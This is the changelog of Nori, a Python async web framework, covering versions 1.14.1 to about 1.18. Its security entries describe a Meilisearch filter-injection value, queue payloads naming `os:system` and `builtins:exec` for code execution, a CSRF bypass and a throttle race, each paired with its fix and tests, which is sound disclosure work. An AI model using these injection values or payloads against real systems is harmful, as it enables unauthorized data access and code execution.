- **Throttle bypass closed.** Same shape, different module: `throttle()` did `get_timestamps` + `add_timestamp`, so 50 concurrent callers against a `5/minute` limit all read `count=0` and added their entry — the limit was silently disabled. Fixed via the new `check_and_add` primitive. Memory backend serializes with the asyncio lock; Redis backend wraps `ZREMRANGEBYSCORE` + `ZCARD` + `ZADD` in a single Lua script. Regression test fires 50 concurrent calls and asserts exactly 5 are allowed. (Round 4, finding 2.2.)
- **`revoke_token` is no longer a denial-of-service path.** Crashing on a missing optional claim let any logout request with a foreign token take down the request handler. See upgrade note 3.

### Performance

- **GCS RSA signing offloaded to a worker thread.** `_load_credentials()` (sync file I/O) and `_build_jwt()` (CPU-bound RSA signing) ran inline on the event loop. Under load, every token refresh — once per hour per process — stalled every other request handler. Both are now wrapped in `asyncio.to_thread`. Regression test asserts both functions are offloaded. (Round 4, finding 3.1.)
- **Persistent `httpx.AsyncClient` across all service drivers.** Six drivers (`mail_resend`, `storage_gcs`, `storage_s3`, `oauth_github`, `oauth_google`, `search_meilisearch`) wrapped each request in `async with httpx.AsyncClient()`, paying a fresh TCP+TLS handshake every send/upload/OAuth callback. Each driver now holds one module-level client and exposes `shutdown()` for the ASGI lifespan. Audit highlighted only two; defensive sweep covered the other four to prevent the next audit round. (Round 4, finding 3.3 + audit-driven sweep.)

### Added

- **`core.cache.cache_incr(key, ttl=0) -> int`** — atomic increment. Returns the new value. Sets the TTL only on first increment (when the resulting value is 1) so reset semantics are predictable. Memory and Redis implementations included.
- **`core.cache.cache_atomic_update(key, fn, ttl=0) -> Any`** — read-modify-write under the cache lock. `fn` MUST be idempotent under the Redis backend, which retries on `WatchError`. Use this when `cache_incr` is too narrow (composite values, non-integer state).
- **`shutdown()` on every service driver.** Apps that want to close the HTTP pool cleanly on app shutdown can wire `from services.foo import shutdown as _foo_shutdown` into their lifespan handler. Drivers without registration are not affected — `_get_client()` is lazy.

### Conventions (AGENTS.md §6)

Codified the anti-patterns the audit kept catching, so code review surfaces them before they ship:

- **Cache atomicity**: counters/limits MUST go through `cache_incr` / `cache_atomic_update`, not `cache_get` + `cache_set`.
- **Async I/O hygiene**: service drivers MUST offload sync disk I/O and CPU-heavy work via `asyncio.to_thread`.
- **Connection reuse**: drivers using `httpx` MUST hold one persistent `AsyncClient` at module level.
- **Optional spec fields**: JWT/OAuth claim access MUST treat optional fields as `None` (`.get('jti')`, not `payload['jti']`).

§7 also gains a "Concurrency hazards: TOCTOU in cache-backed counters" subsection with the bug class explanation, fix recipe, and the pre-merge check.

### Changed

- `revoke_token()` return type changed from `None` to `bool`. See upgrade note 3.
- `CacheBackend` and `ThrottleBackend` ABCs gained new abstract methods. Custom subclasses need updating before upgrading.

---

## [1.17.0] — 2026-04-30

### Upgrade notes — read first

This release closes a deep audit (3 rounds) and ships three breaking-by-design behavior changes alongside performance and stability fixes. Read this section before upgrading any project that runs on custom CSRF flows, bulk soft-deletes, or background queues.

**1. CSRF middleware no longer exempts JSON requests.** Pre-v1.17.0, `CsrfMiddleware` skipped validation when the request had `Content-Type: application/json`. That was a bypass: a logged-in user on a malicious site could be coerced into POST/PUT/DELETE actions via `fetch(..., {credentials: 'include'})` because the browser sent the session cookie and Nori ignored the missing token. JSON clients (SPAs, fetch, axios) now MUST send `X-CSRF-Token` on every state-changing request:

```javascript
fetch('/api/articles', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': document.querySelector('meta[name=csrf]').content,
        'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
});
```

**2. Bulk soft-delete via QuerySet now soft-deletes (was hard-deleting).** Pre-v1.17.0, `await Post.objects.filter(...).delete()` on a model using `NoriSoftDeletes` executed a HARD DELETE — the framework was nuking rows the developer thought it was preserving. The mixin now overrides `QuerySet.delete()` to set `deleted_at = NOW()`. If you need a real hard delete on a soft-delete model, call `force_delete()`:

```python
# Soft delete (new default; previously was hard delete)
await Post.objects.filter(status='draft').delete()

# Real hard delete — explicit opt-in
await Post.objects.filter(status='draft').force_delete()
```

The model-level `await post.delete()` already soft-deleted before this release; only the QuerySet path was broken.

**3. Queue worker rejects payloads outside `QUEUE_ALLOWED_MODULES`.** `execute_payload()` previously imported any module named in the queue payload. With write access to the queue store (SQL injection reaching `jobs`, unauthenticated Redis), that became arbitrary code execution under the worker's privileges. The worker now checks `mod_path` against `QUEUE_ALLOWED_MODULES` (default `['modules.', 'services.', 'app.', 'tasks.']`) before importing.

If your jobs live outside the default locations, extend the list in `settings.py`:

```python
QUEUE_ALLOWED_MODULES = ['modules.', 'services.', 'app.', 'tasks.', 'my_jobs.']
```

Each prefix should end with `.` (Nori normalizes missing trailing dots, but the explicit form prevents prefix-attack confusion). Out-of-list paths raise `PermissionError` and count as job failures — they retry through normal backoff and dead-letter, so a poisoned payload cannot stall the worker.

### Security

- **Queue payload RCE blocked via module allow-list.** See upgrade note 3. `tests/test_core/test_queue.py` covers `os:system`, `subprocess:run`, `builtins:exec`, prefix-attack normalization, and custom allow-list overrides.

- **CSRF JSON exemption removed.** See upgrade note 1. The `Content-Type: application/json` short-circuit was a bypass — browsers send session cookies cross-origin regardless of the body type, and CORS misconfiguration is not a defence Nori can enforce.

- **Meilisearch filter values are now escaped and keys validated.** `_build_filter_string` previously interpolated values directly: `f'{k} = "{v}"'`. An attacker submitting `Electronics" OR status = "private` for a category filter could inject `OR status = "private"` and read unauthorized documents. Values now have backslashes and double-quotes escaped; keys must match `^[A-Za-z_][A-Za-z0-9_.\-]*$` (a `ValueError` is raised otherwise — Meilisearch field names cannot legally contain operators).

- **Google OAuth driver clears unverified email.** `services/oauth_google.py` previously returned `data.get('email', '')` regardless of `email_verified`. An app using `profile['email']` as identity could be tricked into linking the OAuth identity to an existing user with that address. The driver now returns `email = ''` when `email_verified` is False (or missing). The unverified value remains accessible via `profile['raw']['email']` for callers that explicitly want it. The GitHub driver was reviewed and left unchanged: it already filters `primary AND verified` through `/user/emails` when `/user.email` is null, and GitHub guarantees that a publicly-set `user.email` is verified.

- **Installer integrity: `--checksum` flag + always-on SHA-256 transparency.** `docs/install.py` now prints the downloaded zip URL and SHA-256 on every install. Record it from a trusted run, then pass it back via `--checksum H` on subsequent installs to abort on mismatch. Defends against tag mutation, mirror compromise, accidental re-tag — does not replace TLS (which still blocks MitM via `urllib`'s default certificate verification). Threat model documented in `docs/installation.md`.

### Performance

- **Local file uploads are now offloaded to a thread.** `_store_local()` previously did `Path(file_path).write_bytes(content)` on the asyncio loop, which froze the worker for the duration of the disk write. Concurrent requests could stack behind a slow upload (NFS, network FS, large file). Writes now go through `asyncio.to_thread()` so the loop stays responsive.

### Fixed

- **Bulk soft-delete via QuerySet was hard-deleting.** See upgrade note 2. `SoftDeleteQuerySet.delete()` overrides the inherited Tortoise `delete()`; `force_delete()` exposes the original behavior for explicit hard delete.

- **`migrate:fresh` drop subprocess crashed on projects with framework-aware `settings.py`.** The subprocess ran `import settings` but did not call `configure(settings)`, so any user-land import touching `config.X` at module load died with `RuntimeError: Nori config not initialised`. Brought into line with `migrate_init`, `migrate_upgrade`, `routes_list`. Regression test: `test_migrate_fresh_drop_subprocess_calls_configure`.

- **Redis worker double-executed delayed jobs under multi-worker deployments.** The promotion loop did `ZRANGEBYSCORE` → `LPUSH` → `ZREM` as three separate round-trips. Two workers running this in parallel could both read the same set of due-for-promotion jobs before either `ZREM`med, then both `LPUSH` the same job — silent double-execution of any non-idempotent task (charges, notifications). Promotion is now a single Lua `EVAL`, atomic across the worker pool.

### Added

- **`install.py` preserves user files outside the manifest.** Scaffolding into a non-empty directory was previously refused outright. The installer now refuses only when manifest paths would clobber existing files, leaving anything else (TEMPLATE_USAGE.md, `.github/`, custom files) untouched. Failure cleanup respects the same boundary — a mid-run failure no longer wipes pre-existing user files.

- **`Job` model regression test.** `tests/test_core/test_queue.py::test_job_model_does_not_use_soft_deletes` asserts that `Job` does not inherit `NoriSoftDeletes`. The worker hard-deletes successful jobs to keep the table bounded; soft-deleting them would let the `jobs` table grow forever and slow the polling query linearly with history. Today's code is correct — the test prevents a future contributor from "harmonizing" the model.

### Documentation

- `docs/security.md` — new section "Queue Worker Module Allow-List" + checklist item.
- `docs/background_tasks.md` — atomic-locking description now spells out the database (`UPDATE ... WHERE reserved_at IS NULL`) and Redis (Lua `EVAL`) mechanisms; new "Security: module allow-list" section.
- `docs/collections.md` — new "When NOT to use NoriCollection" section pointing at `paginate()`, `QuerySet.count()`, and Tortoise's `values_list()` for large datasets.
- `docs/architecture.md` — warning about shadowing stdlib at the application root.
- `docs/installation.md` — `--checksum` flag documented, with the supply-chain threat model spelled out (what it defends against, what it does not).
- `docs/authentication.md` — "Email is fail-closed" section documenting the `profile['email']` contract for OAuth drivers.
- `AGENTS.md` — `push()` reference now mentions `QUEUE_ALLOWED_MODULES`; `core/queue_worker.py` and `core/queue.py` added to the docs↔code high-leverage targets list.

### Changed

- `core.queue_worker.execute_payload()` now raises `PermissionError` for module paths outside `QUEUE_ALLOWED_MODULES` before importing.
- `core.queue_worker._work_redis()` uses a Lua `EVAL` for delayed-job promotion (was three separate Redis calls).
- `core.mixins.soft_deletes.NoriSoftDeletes` now exposes `SoftDeleteQuerySet` with `delete()` (soft) and `force_delete()` (hard).
- `services.oauth_google.handle_callback()` returns `email = ''` when `email_verified` is False.
- `services.search_meilisearch._build_filter_string()` escapes `\` and `"` in values; raises `ValueError` for keys outside `^[A-Za-z_][A-Za-z0-9_.\-]*$`.
- `core.http.upload._store_local()` uses `asyncio.to_thread()` for the disk write.
- `docs/install.py.parse_args()` accepts `--checksum H` (lowercased).
- `docs/install.py.fetch_and_extract()` accepts `expected_checksum` and aborts on mismatch.
- `core.cli.migrate_fresh()` drop subprocess calls `configure(settings)` before importing user models.

---

## [1.16.0] — 2026-04-28

### Upgrade notes — read first

This release fixes a **critical security bug** in JWT token revocation under Redis, plus a footgun in form validation. Both required changing public API surfaces, hence the minor version bump.

**1. `verify_token()` is now `async`.** Every caller must add `await`:

```python
# Before
payload = verify_token(token)

# After
payload = await verify_token(token)
```

Affected: any code calling `core.auth.jwt.verify_token` directly. The framework's own `@jwt_required` decorator and `revoke_token()` were updated internally — projects using only the decorator do not need to change anything.

If your code currently calls `verify_token()` outside an async context (CLI scripts, sync utilities), wrap it in `asyncio.run(...)`.

**2. `validate()` now raises on async-only rules.** If you have a sync `validate()` call with the `unique` rule, it will now raise `ValueError` instead of silently dropping the rule. Switch those call sites to `await validate_async(...)`:

```python
# Before — unique was silently skipped, accepting duplicates
errors = validate(form, {'email': 'required|unique:users,email'})

# After — unique is enforced via the database
errors = await validate_async(form, {'email': 'required|unique:users,email'})
```

This is intentional: pre-v1.16.0 the rule was silently dropped, leaving uniqueness checks unenforced.

### Security

- **JWT token revocation was completely broken under Redis.** `core.auth.jwt._is_blacklisted` reached into `backend._store` directly — an attribute that exists only on `MemoryCacheBackend`. With Redis (or any non-memory backend), `hasattr(backend, '_store')` returned False, the read returned None, and the function reported "not blacklisted" for every token. The write side (`revoke_token`) used the proper async cache interface, so revocations were silently stored and silently ignored. **Any production deployment using `CACHE_BACKEND=redis` and JWT revocation was unable to revoke tokens.**

  Fix: `verify_token()` and `_is_blacklisted()` are now async and route through `core.cache.cache_get`. The TTL bookkeeping inside `_is_blacklisted` was removed — backends already enforce TTL on `.get()`, so the prior `_, expires_at = entry` destructuring and `time.time() > expires_at` check were redundant.

  Regression test: `tests/test_jwt.py::test_revoke_token_blocks_verify_under_redis_backend` wires `RedisCacheBackend` with `fakeredis` and asserts that revoke→verify blocks. Sanity-asserts `not hasattr(backend, '_store')` to guarantee the test exercises the previously-broken path. Skipped locally when fakeredis is not installed; runs in CI.

### Fixed

- **`validate()` no longer silently drops `unique` rules.** Pre-v1.16.0, calling `validate(data, {'email': 'unique:users,email'})` returned an empty error dict — the `unique` keyword was a no-op in the sync path. Controllers that imported `validate` (instead of `validate_async`) skipped uniqueness checks without warning. Now `validate()` raises `ValueError` with the offending field+rule pairs enumerated, directing the caller to `validate_async`. Internal call from `validate_async` itself bypasses the check via a private `_skip_async_check=True` parameter.

- **Startup verification of cache/throttle backends now logs via `_log.critical` before re-raising.** Pre-v1.16.0 a misconfigured `REDIS_URL` produced a bare `RuntimeError` traceback on stderr that bypassed structured (JSON) log pipelines. Now the failure is logged with `exc_info=True` so GCP/Datadog/Splunk capture it as a structured event, then re-raised to abort startup as before. Behavior unchanged: misconfigured deployments still fail fast — they just leave a better forensic trail.

### Not changed (deliberately)

- **`tortoise-orm<1.0` pin via aerich** (raised in the v1.16.0 review). The constraint is real — aerich 0.9.x pins `tortoise-orm<1.0,>=0.21.0`, which transitively forces Nori projects onto Tortoise 0.25.x. The exit path (drop aerich for an in-house migration tool) is a multi-month project with significant scope; meanwhile, aerich 0.9.2 (adopted in v1.15.0) ships every fix Nori users care about, and the comment in `requirements.nori.txt` already documents the constraint with the right re-evaluation trigger ("revisit when aerich drops the `<1.0` pin"). No code change in this release; tracked as ongoing observation, not a TODO.

### Changed

- **`core.auth.jwt.verify_token` signature**: `def verify_token(token) -> dict | None` → `async def verify_token(token) -> dict | None`.
- **`core.auth.jwt._is_blacklisted` signature**: `def _is_blacklisted(jti) -> bool` → `async def _is_blacklisted(jti) -> bool`. Internal — mentioned for completeness.
- **`core.auth.decorators.jwt_required`**: internally awaits `verify_token` (no change to the decorator's public contract).
- **`core.http.validation.validate`** gains a private keyword-only argument `_skip_async_check=False`. Public callers should not set it; `validate_async` passes `True` to bypass the new gate so it can run the sync portion of the logic without false-positive raises.

### Test coverage

- 14 tests in `tests/test_jwt.py` migrated to async (added `@pytest.mark.asyncio` and `await`).
- 1 new regression test for the Redis-backed revocation path (uses fakeredis; skipped without it).
- 2 new tests in `tests/test_core/test_validation.py` for the new sync-validate gate; the previous `test_unique_ignored_in_sync_validate` (which asserted the buggy behavior was intentional) has been replaced with `test_unique_raises_in_sync_validate` and `test_validate_lists_all_async_violations`.

### Compatibility

This is a **breaking** release for any project that:
- Imports `verify_token` from `core.auth.jwt` and calls it without `await` (rare; the framework's own decorator handles this internally).
- Calls `validate()` with a `unique:` rule expecting it to be evaluated (was silently dropped pre-v1.16.0; now raises).

Projects using `@jwt_required` and `await validate_async(...)` are unaffected by the API changes. **All deployments using `CACHE_BACKEND=redis` are affected by the security fix and must upgrade.**

---

## [1.15.4] — 2026-04-28

### Upgrade notes — read first

This release fixes a middleware-ordering bug in the **scaffolding** `asgi.py`. Because `asgi.py` is user-owned (created by `nori:init`, not replaced by `framework:update`), **existing projects must apply the fix manually**. Fresh projects created from v1.15.4 onward inherit the corrected file.

To patch an existing project, open `rootsystem/application/asgi.py` and locate the CORS conditional. Change:

```python
middleware.insert(1, Middleware(CORSMiddleware, ...))
```

to:

```python
middleware.insert(2, Middleware(CORSMiddleware, ...))
```

Or replace the whole middleware block with the v1.15.4 form (a `_build_middleware(settings)` helper) — see the upstream `rootsystem/application/asgi.py` in this release for the canonical shape.

If `CORS_ORIGINS` is empty in your `.env`, you are not affected — the bug only triggers when CORS is enabled.

### Fixed

- **`rootsystem/application/asgi.py`: CORS middleware was being inserted at index 1, ahead of `SecurityHeadersMiddleware`.** With CORS enabled the actual stack was `RequestId → CORS → SecurityHeaders → Session → CSRF`, so preflight `OPTIONS` responses skipped the security headers (`X-Content-Type-Options`, `X-Frame-Options`, HSTS, etc.). The intent — documented in `docs/architecture.md` and the file's own comment — was always `RequestId → SecurityHeaders → CORS → Session → CSRF`, ensuring `SecurityHeadersMiddleware` wraps every response including preflights. Fix changes `insert(1, ...)` to `insert(2, ...)`.

- **`rootsystem/application/settings.py`: `REDIS_URL` was placed in the middle of the "Trusted proxies" block.** Moved next to `CACHE_BACKEND` and `THROTTLE_BACKEND`, the two settings that consume it. Cosmetic; no runtime effect.

### Changed

- **`asgi.py`: middleware construction extracted to a pure helper** `_build_middleware(settings_module) -> list[Middleware]`. Mechanical refactor that makes the order assertable in a unit test (see below). The top-level `middleware = _build_middleware(settings)` line preserves the previous behavior bit-for-bit when CORS is disabled, and produces the corrected order when enabled.

### Test coverage

- 2 new tests in `tests/test_asgi.py`:
    - `test_middleware_order_without_cors` asserts the four-entry stack (`RequestId, SecurityHeaders, Session, CSRF`).
    - `test_middleware_order_with_cors_keeps_security_headers_outside_cors` asserts the five-entry stack with CORS at index 2 and an explicit `SecurityHeaders < CORS` invariant. Regression coverage for the bug above — the previous `insert(1, ...)` form would fail this test.

### Compatibility

- Behavior change scoped to projects that **enable CORS**. With `CORS_ORIGINS` non-empty, preflight `OPTIONS` responses now include the security headers they were silently skipping. No public API changes, no new settings, no runtime dependency changes. The `_build_middleware` helper is internal to scaffolding (leading underscore) — projects that customize their `asgi.py` are not required to adopt it.

### Related

- Surfaced during a manual scaffolding review (asgi.py, settings.py, services/*.py). All ruff/mypy/coverage gates were clean — this was a docs-vs-code coherence bug that no static tool could catch.

---

## [1.15.3] — 2026-04-28

### Added

- **`framework:check-config` CLI command** — read-only diff of the project's `pyproject.toml` against the upstream Nori release's. `framework:update` refreshes framework code but never touches `pyproject.toml` (it would clobber user customizations), so projects silently fall behind on framework-side tooling improvements (new ruff rules, new `[[tool.mypy.overrides]]` strict modules, bumped coverage thresholds). The new command surfaces that drift without modifying anything.

  The output is categorized into three sections:
    - **Added upstream**: keys/tables present in the release but missing locally — usually additions worth adopting.
    - **Changed upstream**: keys present in both with different values; each entry shows yours vs upstream (e.g. `tool.coverage.report.fail_under` `82` → `86`).
    - **Local-only**: keys present locally but not upstream — your customizations, informational.

  ```bash
  python3 nori.py framework:check-config              # latest
  python3 nori.py framework:check-config --version 1.15.2
  ```

  Implementation lives in `core/cli.py`: `_fetch_text()` retrieves the upstream `pyproject.toml` directly from `raw.githubusercontent.com/<repo>/<tag>/pyproject.toml` (lighter than the full release zip used by `framework:update`); `_diff_toml()` walks two parsed `tomlkit` documents in lockstep, returning categorized diffs keyed by dot-joined paths (e.g. `tool.coverage.report.fail_under`). Lists compare with `==` — any difference is reported as "changed" without element-wise diff (good enough for v1).

  Resolves [#17](https://github.com/sembeimx/nori/issues/17).

### Documentation

- **`docs/cli.md`**: new `### framework:check-config` section with output anatomy and example invocations. Added to the command table.
- **`docs/code_quality.md`**: new "Detecting drift against the latest release" subsection under "Customizing for your project", linking to the CLI reference.

### Test coverage

- 16 new tests in `tests/test_core/test_cli.py`:
    - 6 unit tests for `_diff_toml` covering: matching docs, added upstream, changed value, local-only, nested table walking, list-difference treated as changed
    - 8 end-to-end tests for `framework_check_config` covering: no-drift message, all three categories appear in output with the expected paths, 404 with `--version`, `URLError` on the API call, `URLError` on the raw fetch, missing local `pyproject.toml`, endpoint format `releases/tags/v{X}` with `--version`, endpoint `releases/latest` without
    - 2 dispatcher tests asserting `main()` wires `framework:check-config` correctly with and without `--version`

### Compatibility

- Pure addition. New CLI subcommand; no existing commands or output formats changed. No new runtime dependencies (`tomlkit>=0.13` already in `requirements.nori.txt` since the aerich integration). Read-only — never modifies `pyproject.toml`.

---

## [1.15.2] — 2026-04-27

### Added

- **`framework:update` pre-flight message** (`core/cli.py`). Before downloading the release zip, the command now prints the list of paths it is about to replace, derived live from `_FRAMEWORK_DIRS` / `_FRAMEWORK_FILES` (so the output stays in sync if those constants change). When backups are enabled, the backup destination is printed alongside, formatted as `rootsystem/.framework_backups/v<current>_<timestamp>/`. With `--no-backup`, the path-list still appears but the backup notice is suppressed. Closes the most common upgrade footgun: editing framework code, then losing those edits silently. Now you see the replacement list before the download starts and can Ctrl-C if needed.

- **"File Ownership" section in `docs/architecture.md`**. Authoritative table mapping every path in a Nori project to its owner (Framework / You) and whether `framework:update` replaces it. Three rules of thumb — `core/`, `models/framework/`, and `requirements.nori.txt` are framework-owned; everything else under `rootsystem/application/` is yours. The page also explains the recovery path (the `rootsystem/.framework_backups/` directory) and the right extension points (controllers, service drivers, the config provider) for the cases where users would otherwise reach for `core/`.

- **One-line ownership pointer comment in `core/__init__.py`** linking to the new docs section. Greppable, one place, no banner-spam in individual `core/*.py` files.

### Test coverage

- 1 new `framework_update` test (`test_framework_update_preflight_lists_replaced_paths_and_backup_location`) asserting the pre-flight lists every entry in `_FRAMEWORK_DIRS` / `_FRAMEWORK_FILES` (not a literal copy — the assertion iterates the constants), plus the backup-path hint with the current version embedded. The existing `test_framework_update_skip_backup_does_not_create_backup_dir` was extended to assert the pre-flight still appears but the backup-location notice is suppressed.

### Compatibility

- Pure additions. No public API changes, no settings keys added or renamed, no runtime dependency changes. The pre-flight message adds ~6 lines to `framework:update` output but does not change any side effects (no pause, no prompt, no extra IO). The new `core/__init__.py` comment is two lines of `#` and has no runtime effect.

### Related

- Resolves [#18](https://github.com/sembeimx/nori/issues/18). Companion to [#17](https://github.com/sembeimx/nori/issues/17) (open: `framework:check-config` for `pyproject.toml` drift detection).

---

## [1.15.1] — 2026-04-27

### Test coverage

`framework:update` was the largest single uncovered surface left after v1.14.2 (the 130-line download → extract → backup → replace → patch flow had been deferred as "more brittle to mock than the function it tests"). v1.15.1 closes it with an integration-style test: mock only the network boundary (`_github_api`, `_download_zip`), let the rest run on the real filesystem against `tmp_path`. The same approach catches regressions in the actual update flow rather than asserting the mocks are called.

- **`core/cli.py`: 64.5% → 91.1%** (over two releases — v1.14.2 took 32.5% → 64.5%; v1.15.1 takes it to 91.1%). 14 new `framework_update` tests in `tests/test_core/test_cli.py` covering: happy-path file replacement + backup creation, `releases/latest` vs `releases/tags/v{X}` endpoint selection, already-up-to-date short-circuit, `--force` re-install, 404 with vs without `--version` (specific vs generic error message), `URLError` on the GitHub API call (connection error), `URLError` on the download (download-failed error), zip missing `rootsystem/application/core/` (abort with original files preserved), `--no-backup` skipping backup creation, non-dict release shape (defensive abort), HTTP non-404 errors re-raised so the caller sees the real failure, and the conditional `migrate:fix` reminder firing when `migrations/<app>/` contains real migration files. Plus 3 small additions: `_has_existing_migrations` skipping non-directory entries under `migrations/`, `make_model` overwrite refusal (parallel to the existing controller/seeder coverage), and the HTTP non-404 reraise.

- **Project total: 86.2% → 89.9%.** Test count: 723 → **744**.

### Changed

- **Coverage floor raised from 82% to 86%** (`pyproject.toml`'s `[tool.coverage.report]`). Current baseline 89.9%, ~4-point buffer — same posture as the v1.14.2 75→82 bump. Floor history is now documented in the file.

### Compatibility

- Pure additions. No public API changes, no settings keys added or renamed, no runtime dependency changes.

---

## [1.15.0] — 2026-04-27

### Upgrade notes — read first

This release raises the `aerich` floor from `>=0.8` to `>=0.9.2`. **Existing projects with migration files generated by `aerich<=0.9.1` MUST run a one-time fix command after upgrading**, or future `migrate:make` invocations may fail:

```bash
python3 nori.py framework:update
python3 nori.py migrate:fix    # one-time, idempotent — fills MODELS_STATE in existing migration files
```

`framework:update` now detects existing migrations under `migrations/<app>/` and prints this reminder at the end of the upgrade flow, so the next step is always visible.

Fresh installs are unaffected: new projects generate migrations directly with aerich 0.9.2 and skip the fix step.

The `tortoise-orm<1.0` upper bound is unchanged — aerich 0.9.x still pins `tortoise-orm<1.0.0,>=0.21.0`, and we revisit the moment aerich drops that pin.

### Changed

- **`aerich` floor raised: `>=0.8` → `>=0.9.2`** (`requirements.nori.txt`). Picks up upstream fixes that affect Nori users:
  - **Postgres**: unique constraint now correctly dropped on column-type changes; m2m comments no longer set before the table exists; pgvector data types no longer raise during introspection.
  - **MySQL**: `alter column unique → indexed` no longer drops the wrong index name.
  - **Generic**: m2m table is now removed when its parent model is dropped; recursive m2m migrations no longer error; constraint-key error during migration generation fixed.
  - **Migration files**: new `RUN_IN_TRANSACTION` attribute (per-migration transaction control); `--offline` flag for `aerich migrate` (interesting building block for the `migrate:sql` roadmap item).

- **`framework:update` post-upgrade output gained a conditional `migrate:fix` reminder.** The new helper `_has_existing_migrations()` (`core/cli.py`) walks `migrations/<app>/` looking for any `.py` file that isn't `__init__.py`; if any exist, the upgrade summary now ends with the exact command to run. Pure additive — fresh projects (no migrations yet) see the same output as before.

### Test coverage

- 5 new tests for `_has_existing_migrations` in `tests/test_core/test_cli.py` covering: missing migrations dir, empty migrations dir, app dir with only `__init__.py`, single app with one migration file, multi-app where only one has real migrations.

### Compatibility

- **Breaking for existing projects**: requires the one-time `python3 nori.py migrate:fix` step described above. Without it, future `migrate:make` invocations may raise `KeyError` on `MODELS_STATE`.
- No public Python API changes. No settings keys added or renamed. The `migrate:fix` command itself already existed (since aerich shipped `fix-migrations`); v1.15.0 only makes the upgrade step discoverable from the framework's own upgrade output.

---

## [1.14.2] — 2026-04-27

### Test coverage

The biggest single coverage push since the framework started measuring it. Three formerly under-tested surfaces moved into well-covered territory; the project floor was raised to lock in the new baseline.

- **`core/cache.py` — `RedisCacheBackend`: 65.7% → 96.7%.** 14 new tests in `tests/test_core/test_cache.py` exercise the Redis-backed cache via `fakeredis` (an in-memory drop-in for `redis-py`'s asyncio interface). Covered: `set`/`get` round-trip for strings and dicts, missing-key returns `None`, ttl=0 stores without expiry while ttl>0 applies `setex`, `delete`, prefix-aware `flush` (SCAN-based, leaves unrelated keys alone), JSON default serialization for `datetime`/`Decimal`/`UUID`, `TypeError` on unsupported types, bytes-fallback for non-JSON payloads, `verify()` success and `RuntimeError` naming the URL on connection failure, `shutdown()` closing the connection pool, and `get_backend()` selecting Redis when `CACHE_BACKEND=redis`.

- **`core/http/throttle_backends.py` — `RedisBackend`: 64.6% → 100.0%.** 8 new tests in `tests/test_throttle_backends.py` covering the sorted-set timestamp store: `add_timestamp` + `get_timestamps` round-trip, automatic pruning of entries older than the window, `cleanup` dropping below-cutoff entries, `verify` success/failure paths, `shutdown` closing the pool, `get_backend` selecting Redis when `THROTTLE_BACKEND=redis`, and the `MemoryBackend` lazy global cleanup running at the `_CLEANUP_EVERY` threshold.

- **`core/cli.py`: 32.5% → 64.5%** — almost doubled. 37 new tests in `tests/test_core/test_cli.py` covering: subprocess wrappers (`serve` driving uvicorn with the right flags + Ctrl-C handling, `shell` setting `PYTHONSTARTUP` + cleaning up the temp file, `db_seed` running the inline seed script, `queue_work` baking the queue name into the script, `audit_purge` formatting `--days`/`--export`/`--dry-run` into the embedded script, `check_deps` propagating non-zero exit codes via `sys.exit`); helpers (`make_seeder` overwrite refusal, `_get_current_version` reading `__version__` with `'unknown'` fallback, `_github_api` sending the correct `User-Agent`/`Accept` headers and adding `Authorization: Bearer` when `GITHUB_TOKEN` is set, `_download_zip` streaming bytes to disk); and the `main()` argparse dispatcher across all 19 subcommands. The 130-line `framework_update` flow (download → extract → backup → migrate) is left for a future integration-style pass — unit-mocking every step would be more brittle than the function it tests.

**Project total: 78.2% → 86.2%** (over two releases — v1.14.1 contributed 78.2 → 79.5; v1.14.2 contributed 79.5 → 86.2). Test count: 642 → **723**.

### Changed

- **Coverage floor raised from 75% to 82%** (`pyproject.toml`'s `[tool.coverage.report]`). Current baseline is 86.2%, so the gate has a ~4-point buffer for routine churn — tight enough that a meaningful regression flips it, loose enough that an unrelated PR adding a few untested lines doesn't break the build. Documented in `docs/code_quality.md` and `docs/roadmap.md`.

### Fixed

- **`redis-py`'s `ping()` stub union now narrowed via `cast`** in both `core/cache.py:RedisCacheBackend.verify()` and `core/http/throttle_backends.py:RedisBackend.verify()`. The stub types `ping()` as `Awaitable[bool] | bool` to cover the sync/async overload split; on the asyncio client the result is always a coroutine. `cast(Awaitable[bool], self._redis.ping())` narrows it for `mypy --strict` (now active on `auth.csrf` etc., where this was surfacing as a transitive error). Behavior unchanged.

### Added

- **`fakeredis>=2.20`** in `requirements-dev.txt`. Used by the Redis backend tests above; transparent to runtime code (framework `requirements.nori.txt` keeps `redis` as the actual Redis client).

### Compatibility

- Pure additions. No public API changes, no settings keys added or renamed, no runtime dependency changes. The coverage threshold bump only affects projects that copy the framework's `pyproject.toml` `[tool.coverage.report]` section into their own — projects on lower coverage still control their own threshold.

---

## [1.14.1] — 2026-04-27

### Fixed

- **Replaced deprecated `datetime.datetime.utcnow()`** with timezone-aware `datetime.datetime.now(datetime.timezone.utc)` at three sites: `services/storage_s3.py:63` (AWS SigV4 signing timestamp), `core/cli.py:658` (`audit_log:purge` cutoff query), and `core/cli.py:674` (audit log export filename). `datetime.utcnow()` is deprecated in Python 3.12+ and scheduled for removal; the test suite no longer emits the `DeprecationWarning`. The SigV4 strftime output is byte-identical to the previous code (the `Z` is a literal in the format string), so existing signed requests are unaffected. Uses `timezone.utc` (Python 3.0+) rather than `datetime.UTC` (3.11+) to keep the framework's 3.10 floor honest.

### Changed

- **`mypy --strict` now applies to three more high-stakes auth modules**: `core.auth.csrf`, `core.auth.jwt`, and `core.auth.oauth`. The strict-enforced surface goes from 3 to 6 modules (alongside the existing `core.auth.security`, `core.auth.login_guard`, `core.http.validation`). Type changes to satisfy the new flags: ASGI signatures in `csrf.py` annotated with `starlette.types` (`ASGIApp`, `Scope`, `Receive`, `Send`, `Message`); `verify_token` return type tightened from `dict` to `dict[str, Any] | None`; local annotations in `_get_secret`, `verify_token`, `get_pkce_verifier`, `_read_body` to narrow `config.get` / `dict.get` / `json.loads` Any returns. Renamed a shadowed loop variable in `_parse_multipart_token` (`part: str` vs `part: bytes`) to `seg`. No behavior changes; 45 auth tests pass.

### Test coverage

- **`services/search_meilisearch.py`: 43.1% → 100%.** 11 new tests in `tests/test_search_meilisearch.py` covering `_get_headers` with/without API key, `_get_base_url` default + trailing-slash stripping, `_search` URL/payload/filter/empty-hits, `_index_document` with id override, `_remove_document`, and `register()`. Same `AsyncMock + patch('httpx.AsyncClient')` pattern as `tests/test_oauth_google.py` and the storage tests — no new test infrastructure.

- **`modules/page.py`: 66.7% → 100%.** New `tests/test_page.py` with 4 tests for the default home page controller (status, content type, framework metadata surfaces in body, route count matches `len(routes)`).

